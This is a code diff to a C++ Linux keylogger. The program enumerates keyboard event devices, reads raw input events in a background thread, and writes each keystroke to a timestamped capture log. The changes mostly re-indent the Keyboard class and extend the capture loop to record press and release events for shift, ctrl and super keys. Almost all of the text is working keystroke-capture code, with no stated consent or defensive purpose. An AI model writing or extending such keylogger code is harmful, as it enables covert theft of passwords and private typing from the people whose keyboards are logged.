@@ -23,32 +23,32 @@ static int _isEventDevice(const struct dirent *directory) {
 
 class Keyboard {
     public:
-    std::string devicePath, captureLog;
-    int deviceFile;
+        std::string devicePath, captureLog;
+        int deviceFile;
 
-    Keyboard(std::string devPath, std::string capLog) {
-        devicePath = devPath, captureLog = capLog;
-        deviceFile = -1;
-    }
+        Keyboard(std::string devPath, std::string capLog) {
+            devicePath = devPath, captureLog = capLog;
+            deviceFile = -1;
+        }
 
-    ~Keyboard() {
-        close(deviceFile);
-    }
+        ~Keyboard() {
+            close(deviceFile);
+        }
 
-    void openDeviceFile() {
-        deviceFile = open(devicePath.c_str(), O_RDONLY);
-    }
+        void openDeviceFile() {
+            deviceFile = open(devicePath.c_str(), O_RDONLY);
+        }
 
-    pthread_t getCaptureThread() {
-        return _captureThread;
-    }
+        pthread_t getCaptureThread() {
+            return _captureThread;
+        }
 
-    void capture() {
-        pthread_create(&_captureThread, nullptr, _startCapture, (void *)this);
-    }
+        void capture() {
+            pthread_create(&_captureThread, nullptr, _startCapture, (void *)this);
+        }
 
     private:
-    pthread_t _captureThread;
+        pthread_t _captureThread;
 };
 
 std::vector<Keyboard> findKeyboards() {
@@ -90,6 +90,7 @@ std::vector<Keyboard> findKeyboards() {
 static void* _startCapture(void* threadData) {
     int readEvent;
     struct input_event keyEvent[64];
+    const char* output;
 
     // Retrieve and cast Keyboard instance from threadData
     Keyboard* keyboard = (Keyboard *) threadData;
@@ -104,14 +105,27 @@ static void* _startCapture(void* threadData) {
         logFileStream << "| UTC: " << std::put_time(std::gmtime(&time), "%c %Z") << " |\n"
             << "-------------------------------------\n";
 
-        // Capture keystrokes (but not releases)
-        while (1) {
+        // Capture keystrokes
+        while(true) {
             readEvent = read(keyboard->deviceFile, keyEvent, sizeof(struct input_event) * 64);
-            if (readEvent > 0 && keyEvent[1].value !=0) {
-                logFileStream << keys[keyEvent[1].code] << std::endl;
+            if(readEvent > 0) {
+                output = keys[keyEvent[1].code];
+                /* Record press and release for
+                   modifier keys (shift, ctrl, and super) */
+                if(keyEvent[1].value != 2 && (
+                            std::strncmp(output, "<su", 3) == 0
+                            || std::strncmp(output, "<l-", 3) == 0
+                            || std::strncmp(output, "<r-", 3) == 0
+                            )
+                  ) {
+                    logFileStream << output << " " << keyEvent[1].value << std::endl;
+                }
+                else if(keyEvent[1].value != 0) {
+                    logFileStream << output << std::endl;
+                }
             }
         }
-    }
 
-    pthread_exit(nullptr);
+        pthread_exit(nullptr);
+    }
 }
